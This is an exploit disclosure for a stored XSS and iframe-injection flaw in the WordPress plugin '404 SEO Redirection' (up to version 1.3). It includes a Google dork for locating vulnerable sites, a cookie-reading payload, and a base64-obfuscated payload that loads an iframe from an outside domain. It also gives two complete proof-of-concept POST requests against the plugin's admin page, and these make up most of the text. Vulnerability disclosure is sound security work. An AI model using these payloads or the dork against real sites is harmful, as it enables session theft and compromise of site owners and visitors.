/*!
- # VULNERABILITY: 404 SEO Redirection WordPress Plugin <= 1.3 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/404-redirection-manager/
- # DATE: 2021-03-29
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Fakhri Alsadi [ https://www.clogica.com ]
- # SOFTWARE VERSION: <= 1.3
- # SOFTWARE LINK: https://wordpress.org/plugins/404-redirection-manager/
- # CVSS: AV:N/AC:L/PR:H/UI:R/S:C
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS & XFS vulnerabilities was discovered in the 404 SEO Redirection plugin through v1.3 for WordPress.

[i] Vulnerable parameter(s): &redirect_from= and &redirect_to=.



### -- [ Impact: ]

[~] Malicious JavaScript code or iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] #" style=position:fixed!important;z-index:99999;display:flex;align-items:center;justify-content:center;width:100%;height:100%;top:0;bottom:0;left:0;right:0;overflow:visible!important; onmousemove=(alert)(document.cookie) " m0ze= "

[$] " onmouseover=eval(atob(`eD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTt4LnNyYz0naHR0cHM6Ly9tMHplLnJ1L3BheWxvYWQveGZzaWkuaHRtbCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs=`)); "



### -- [ PoC #1 | Authenticated Persistent XSS & XFS | Rule: ]

[!] POST /wp-admin/options-general.php?page=404-redirection-manager.php&404_manager_tab=404_rules HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 415
Cookie: [admin cookies]

enabled=1&redirect_from_type=Folder&redirect_from=%23%22+style%3Dposition%3Afixed%21important%3Bz-index%3A99999%3Bdisplay%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bwidth%3A100%25%3Bheight%3A100%25%3Btop%3A0%3Bbottom%3A0%3Bleft%3A0%3Bright%3A0%3Boverflow%3Avisible%21important%3B+onmousemove%3D%28alert%29%28document.cookie%29+%22+m0ze%3D+%22&redirect_to=%2F%2Fm0ze.com&redirect_type=301&save=&add=1



### -- [ PoC #2 | Authenticated Persistent XSS & XFS | Redirect To: ]

[!] POST /wp-admin/options-general.php?page=404-redirection-manager.php&404_manager_tab=404_rules HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 322
Cookie: [admin cookies]

enabled=1&redirect_from_type=Folder&redirect_from=%2F%2Fm0ze.com&redirect_to=%22+onmouseover%3Deval%28atob%28%60eD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTt4LnNyYz0naHR0cHM6Ly9tMHplLnJ1L3BheWxvYWQveGZzaWkuaHRtbCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs%3D%60%29%29%3B+%22&redirect_type=301&save=&add=1



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
